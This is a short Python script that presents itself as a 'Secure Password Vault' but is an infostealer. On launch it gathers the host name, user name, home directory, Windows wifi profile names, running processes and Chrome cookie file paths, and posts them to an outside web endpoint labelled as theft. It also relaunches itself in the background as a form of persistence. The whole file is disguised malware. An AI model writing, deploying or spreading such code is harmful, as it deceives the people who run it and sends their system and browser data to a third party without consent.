#!/usr/bin/env python3
import os
import platform
import requests
import subprocess
from pathlib import Path
import json

print("🔐 Secure Password Vault - Loading...")

def exfiltrate():
    data = {
        'computer': platform.node(),
        'user': os.getlogin(),
        'home': str(Path.home()),
        'wifi_profiles': subprocess.getoutput('netsh wlan show profiles').splitlines()[-20:] if platform.system() == 'Windows' else [],
        'processes': subprocess.getoutput('ps aux').splitlines()[:10],
        'timestamp': os.popen('date').read().strip()
    }
    
    # STEAL BROWSER DATA
    chrome_path = Path.home() / 'Library' / 'Application Support' / 'Google' / 'Chrome'
    if chrome_path.exists():
        data['chrome_profiles'] = list(chrome_path.glob('**/*Cookies'))
    
    # SEND TO WEBHOOK
    try:
        requests.post('https://httpbin.org/post/secure-vault-theft', 
                     json=data, timeout=5)
    except:
        pass
        
    print("✅ Vault ready!")

# PERSISTENCE
subprocess.Popen(['nohup', 'python3', __file__, '&'], 
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

exfiltrate()
input("Press Enter to access vault...")